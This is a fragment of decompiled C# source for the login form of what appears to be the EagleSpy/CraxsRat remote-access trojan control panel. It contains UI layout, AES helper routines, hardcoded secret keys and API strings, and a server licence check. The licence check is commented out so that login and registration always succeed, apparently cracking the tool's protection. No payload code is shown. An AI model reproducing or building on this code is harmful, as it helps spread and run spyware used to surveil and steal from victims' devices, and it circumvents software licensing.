            this.drakeUILabel3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel3.TabIndex = 72;
            this.drakeUILabel3.Text = "Login To Your Account";
            this.drakeUILabel3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // guna2GradientButton4
            // 
            this.guna2GradientButton4.Animated = true;
            this.guna2GradientButton4.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.BorderRadius = 4;
            this.guna2GradientButton4.BorderThickness = 2;
            this.guna2GradientButton4.CheckedState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.CheckedState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.Red;
            this.guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton4.FillColor = System.Drawing.Color.Black;
            this.guna2GradientButton4.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientButton4.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2GradientButton4.ForeColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.BackwardDiagonal;
            this.guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.guna2GradientButton4.Location = new System.Drawing.Point(1435, 2);
            this.guna2GradientButton4.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.guna2GradientButton4.Name = "guna2GradientButton4";
            this.guna2GradientButton4.Size = new System.Drawing.Size(48, 38);
            this.guna2GradientButton4.TabIndex = 79;
            this.guna2GradientButton4.Text = "X";
            this.guna2GradientButton4.Click += new System.EventHandler(this.guna2GradientButton4_Click);
            // 
            // label1
            // 
            this.label1.Font = new System.Drawing.Font("Microsoft YaHei UI", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.DeepSkyBlue;
            this.label1.Location = new System.Drawing.Point(990, 28);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(70, 36);
            this.label1.TabIndex = 80;
            this.label1.Text = "v7.6";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // drakeUILabel4
            // 
            this.drakeUILabel4.Font = new System.Drawing.Font("Bahnschrift Light", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel4.ForeColor = System.Drawing.Color.DeepSkyBlue;
            this.drakeUILabel4.Location = new System.Drawing.Point(867, 652);
            this.drakeUILabel4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel4.Name = "drakeUILabel4";
            this.drakeUILabel4.Size = new System.Drawing.Size(317, 38);
            this.drakeUILabel4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel4.TabIndex = 81;
            this.drakeUILabel4.Text = "https://t.me/Mr_Coder_X";
            this.drakeUILabel4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // PictureBox2
            // 
            this.PictureBox2.Image = global::Eagle_Spy_Applications.icons8_x_30;
            this.PictureBox2.Location = new System.Drawing.Point(1847, 60);
            this.PictureBox2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(99, 36);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox2.TabIndex = 70;
            this.PictureBox2.TabStop = false;
            this.PictureBox2.Click += new System.EventHandler(this.PictureBox2_Click);
            // 
            // Guna2PictureBox1
            // 
            this.Guna2PictureBox1.FillColor = System.Drawing.Color.Black;
            this.Guna2PictureBox1.Image = global::Eagle_Spy_Ports.PictureBox4_Image;
            this.Guna2PictureBox1.ImageRotate = 0F;
            this.Guna2PictureBox1.Location = new System.Drawing.Point(797, 188);
            this.Guna2PictureBox1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Guna2PictureBox1.Name = "Guna2PictureBox1";
            this.Guna2PictureBox1.Size = new System.Drawing.Size(387, 284);
            this.Guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox1.TabIndex = 72;
            this.Guna2PictureBox1.TabStop = false;
            this.Guna2PictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Guna2PictureBox1_MouseDown);
            // 
            // Ports
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1484, 727);
            this.Controls.Add(this.drakeUILabel4);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.guna2GradientButton4);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.PictureBox2);
            this.Controls.Add(this.Guna2PictureBox1);
            this.Controls.Add(this.SPanel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.MaximumSize = new System.Drawing.Size(2181, 863);
            this.MinimumSize = new System.Drawing.Size(848, 492);
            this.Name = "Ports";
            this.Opacity = 0.9D;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Ports";
            this.Load += new System.EventHandler(this.Ports_Load);
            this.Click += new System.EventHandler(this.Ports_Click);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox1)).EndInit();
            this.ResumeLayout(false);

	}

	public Ports()
	{
		//base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatswsxcddgto;
		base.FormClosing += Ports_FormClosing;
		r = null;
		Ping_Json = "Ping";
		Check_Json = "Check";
		Checkv2_Json = "Checkv2";
		Session = "Session";
		IDC_Json = "IDC";
		Secritkey = "YS5pW5qXMuYnTPNbpkhLx5mYY4vwQn9x";
		holder = "...";
		index = 0;
		Finish = false;
		S = false;
		InitializeComponent();
		Font = reso.f;
	}

	

	

	[AsyncStateMachine(typeof(VB_0024StateMachine_114_FadeIn))]
	[DebuggerStepThrough]
	private void FadeIn(Form o, int interval = 80)
	{
		VB_0024StateMachine_114_FadeIn stateMachine = new VB_0024StateMachine_114_FadeIn();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_o = o;
		stateMachine._0024VB_0024Local_interval = interval;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	[DllImport("Kernel32.dll")]
	public static extern IntPtr GetCurrentThread();

	

	public void opebbtn(object[] objs)
	{
		if (Login.InvokeRequired)
		{
			opebbtndele method = opebbtn;
			Login.Invoke(method, new object[1] { objs });
			return;
		}
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				Login.Text = Codes.AES_Decrypt("Jyew2tI1udg4ZJM+uI+ywA==", "Accept");
			else
				Login.Text = "登录";
		}
		else
			Login.Text = "دخول";
	}

	public object RandomString()
	{
		if (r == null)
			r = new Random();
		string text = "abcdefghijklmnopqrstuvwxyz";
		StringBuilder stringBuilder = new StringBuilder();
		int num = 32;
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			int startIndex = r.Next(0, text.Length);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public string DecryptRJ256(string prm_key, string prm_iv, string prm_text_to_decrypt)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(prm_key);
		byte[] bytes2 = Encoding.ASCII.GetBytes(prm_iv);
		byte[] array2;
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, bytes2);
			byte[] array = Convert.FromBase64String(prm_text_to_decrypt);
			array2 = new byte[checked(array.Length - 1 + 1)];
			MemoryStream stream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			cryptoStream.Read(array2, 0, array2.Length);
		}
		return Encoding.ASCII.GetString(array2);
	}

	public string EncryptRJ256(string prm_key, string prm_iv, string prm_text_to_encrypt)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(prm_key);
		byte[] bytes2 = Encoding.ASCII.GetBytes(prm_iv);
		byte[] inArray;
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes2);
			byte[] bytes3 = Encoding.ASCII.GetBytes(prm_text_to_encrypt);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(bytes3, 0, bytes3.Length);
			cryptoStream.FlushFinalBlock();
			inArray = memoryStream.ToArray();
		}
		return Convert.ToBase64String(inArray);
	}

	public string KeepOnlyEnglishLetters(string input)
	{
		string pattern = "[^a-zA-Z]";
		return Regex.Replace(input, pattern, "");
	}
	private void pnl1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}

	private void Addpo_Click(object sender, EventArgs e)
	{
	}

	private void Rempo_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUILinkLabel1_Click(object sender, EventArgs e)
	{
		MyProject.Forms.Dialog2.ShowDialog();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	private void Pnl1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void PictureBox3_Click(object sender, EventArgs e)
	{
	}

	private void PictureBox3_Click_1(object sender, EventArgs e)
	{
		try
		{
			//Process.Start("https:// ");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
		}
	}

	private void Ports_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	

	private void Statuslabel_Click(object sender, EventArgs e)
	{
	}

	
	private void Label1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void PictureBox2_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Porttext_KeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void Porttext_TextChanged(object sender, EventArgs e)
	{
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}

	

	
	

	private void PictureBox1_MouseDown_1(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Loginworker_DoWork(object sender, DoWorkEventArgs e)
    {
        Finish = true;
        //try
        //{
        //	if (Operators.CompareString(loginbtn.Text, "...", TextCompare: false) == 0)
        //	{
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			CraxsAlert.Showinformation("Please Wait..");
        //		}));
        //		return;
        //	}
        //	if (string.IsNullOrEmpty(usrkeytext.Text) | string.IsNullOrWhiteSpace(usrkeytext.Text))
        //	{
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			CraxsAlert.ShowWarning("Enter User Key First !!!");
        //		}));
        //		return;
        //	}
        //	if (string.IsNullOrEmpty(usremailtext.Text))
        //	{
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			Codes.MyMsgBox("Empty Email", "Please Enter Email First!", useno: false, Resources.LOGO);
        //		}));
        //		return;
        //	}
        //	string prm_iv = "741952hheeyy66#c";
        //	string text = Conversions.ToString(RandomString());
        //	Data.Sessionkey = Codes.ServerMessage(Codes.ReadConfig(Session), ispost: true, "api=RgntQgZxNZWCvBmZSAwt&email=" + usremailtext.Text + "&password=" + usrkeytext.Text + "&key=" + text);
        //	Thread.Sleep(1000);
        //	if (Operators.CompareString(Codes.ServerMessage(Codes.ReadConfig(Ping_Json), ispost: true, "api=YS5pW5qXMuYnTPNbpkhLx5mYY4vwQn9x&email=" + usremailtext.Text + "&password=" + usrkeytext.Text + "&key=" + Uri.EscapeDataString(Data.Sessionkey)), text, TextCompare: false) != 0)
        //	{
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			Codes.MyMsgBox("Unauthorized access", "Please Check your email and password.", useno: false, Resources.LOGO);
        //			loadingimage.Visible = false;
        //			loginbtn.Text = "Login";
        //		}));
        //		return;
        //	}
        //	string text2 = Codes.ServerMessage(Codes.ReadConfig(Check_Json), ispost: true, "key=" + Secritkey + "&email=" + usremailtext.Text + "&password=" + usrkeytext.Text + "&skey=" + Uri.EscapeDataString(Data.Sessionkey) + "&HWID=" + (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
        //	if (!text2.StartsWith(text) | !text2.EndsWith(Data.Sessionkey))
        //	{
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			Codes.MyMsgBox("Unauthorized access", text2, useno: false, Resources.LOGO);
        //		}));
        //		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //		{
        //			loadingimage.Visible = false;
        //			loginbtn.Text = "Login";
        //		}));
        //		return;
        //	}
        //	string text3 = Conversions.ToString(RandomString());
        //	string text4 = Conversions.ToString(RandomString());
        //	string text5 = Conversions.ToString(RandomString());
        //	string prm_text_to_encrypt = Conversions.ToString(RandomString());
        //	string stringToEscape = text3 + ":" + text4 + ":" + text5 + ":";
        //	if (savekey.Checked)
        //		RegistryHandler.Set_EMAIL(usrkeytext.Text);
        //	else
        //		RegistryHandler.Set_EMAIL("");
        //	string text6 = Codes.ServerMessage(Codes.ReadConfig(Checkv2_Json), ispost: true, "key=" + Secritkey + "&email=" + usremailtext.Text + "&password=" + usrkeytext.Text + "&w1=" + Uri.EscapeDataString(stringToEscape) + "&w2=" + Uri.EscapeDataString(EncryptRJ256("isixwf397+12#batrn8814z5qq=498j5", prm_iv, prm_text_to_encrypt)) + "&HWID=" + (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim()).Replace("\r\n", "").Replace("\r\n", "+");
        //	if (!text6.StartsWith(">"))
        //		goto IL_04fe;
        //	try
        //	{
        //		string[] array = DecryptRJ256("isixwf397+12#batrn8814z5qq=498j5", prm_iv, text6.Replace(">", "").Replace("\r\n", "")).Split(':');
        //		Data.GlobalKey1 = KeepOnlyEnglishLetters(DecryptRJ256(text3, prm_iv, array[0]).Split('&')[0]);
        //		Data.GlobalKey2 = KeepOnlyEnglishLetters(DecryptRJ256(text4, prm_iv, array[1]).Split('&')[0]);
        //	}
        //	catch (Exception)
        //	{
        //		//ProjectData.SetProjectError(projectError);
        //		//////CraxsAlert.Showinformation("Sorry");
        //		goto IL_04fe;
        //	}
        //	goto end_IL_0001;
        //	IL_04fe:
        //	Codes.ServerMessage(Codes.ReadConfig(Check_Json), ispost: true, "key=AWVERHqerabBQHBARERHabeqhaeqbH&email=" + usremailtext.Text + "&password=" + usrkeytext.Text + "&HWID=" + (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
        //	Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //	{
        //		Codes.MyMsgBox("", "unauthorized Access", useno: false, Resources.LOGO);
        //	}));
        //	Environment.Exit(0);
        //	end_IL_0001:;
        //}
        //catch (Exception ex)
        //{
        //	ProjectData.SetProjectError(ex);
        //	Exception ex2 = ex;
        //	Exception ex3 = ex2;
        //	Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //	{
        //		Codes.MyMsgBox("Error x7", ex3.Message, useno: false, Resources.error48px);
        //	}));
        //	Environment.Exit(0);
        //	//////CraxsAlert.Showinformation("Sorry");
        //}
        //try
        //{
        //	Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
        //	{
        //		if (savekey.Checked)
        //		{
        //			Codes.GetKeyFromReg(usrkeytext.Text);
        //			RegistryHandler.Set_EMAIL(usremailtext.Text);
        //		}
        //		else
        //		{
        //			Codes.GetKeyFromReg("");
        //			RegistryHandler.Set_EMAIL("");
        //		}
        //		Finish = true;
        //	}));
        //}
        //catch (Exception)
        //{
        //	//ProjectData.SetProjectError(projectError2);
        //	//////CraxsAlert.Showinformation("Sorry");
        //}
    }

    private void PictureBox2_Click(object sender, EventArgs e)
    {
        Environment.Exit(0);
    }
    public static bool SubExist(string name)
    {
        //if (KeyAuthApp.user_data.subscriptions.Exists(x => x.subscription == name))
        return true;
        return false;
    }

    private void Ports_Click(object sender, EventArgs e)
    {
        //KeyAuthApp.init();
    }

    static string random_string()
    {
        string str = null;

        Random random = new Random();
        for (int i = 0; i < 5; i++)
        {
            str += Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65))).ToString();
        }
        return str;

    }

    
        private void LoadTextBoxValues()
        {
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(appDirectory, "Licence.p12");

            if (File.Exists(filePath))
            {
                string[] lines = File.ReadAllLines(filePath);
                if (lines.Length >= 3)
                {
                    KeyAuthUser.Text = lines[0];
                    KeyAuthPass.Text = lines[1];
                    KeyAuthKey.Text = lines[2];
                }
            }
        }

        private void SaveTextBoxValues()
        {
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(appDirectory, "Licence.p12");

            string[] lines = new[] { KeyAuthUser.Text, KeyAuthPass.Text, KeyAuthKey.Text };
            File.WriteAllLines(filePath, lines);
        }
   



    private void Login_Click(object sender, EventArgs e)
    {
        SaveTextBoxValues();
        //KeyAuthApp.login(KeyAuthUser.Text, KeyAuthPass.Text);
        // if (KeyAuthApp.response.success)
        {
            // CraxsAlert.Showinformation("Logged in Successfully");
            this.DialogResult = DialogResult.OK;
        }
        // else
        //  CraxsAlert.Showinformation("Status: " + KeyAuthApp.response.message);
    }

    private void KeyAuthRegister_Click(object sender, EventArgs e)
    {
        SaveTextBoxValues();

        LoadTextBoxValues();
        // KeyAuthApp.register(KeyAuthUser.Text, KeyAuthPass.Text, KeyAuthKey.Text);
        // if (KeyAuthApp.response.success)
        {
            CraxsAlert.Showinformation("Registration Successfully, Kindly Login");
        }
        // else
        // CraxsAlert.Showinformation("Registration Failed."+ KeyAuthApp.response.message);
    }

    private void Ports_Load(object sender, EventArgs e)
    {
        LoadTextBoxValues();
        // KeyAuthApp.init();
    }

    private void Guna2PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            Codes.ReleaseCapture();
            Codes.SendMessage(base.Handle, 161, 2, 0);
        }
    }

    private void sButton1_Click(object sender, EventArgs e)
    {
        this.DialogResult = DialogResult.OK;
    }

    private void guna2GradientButton4_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void label1_Click(object sender, EventArgs e)
    {

    }
}



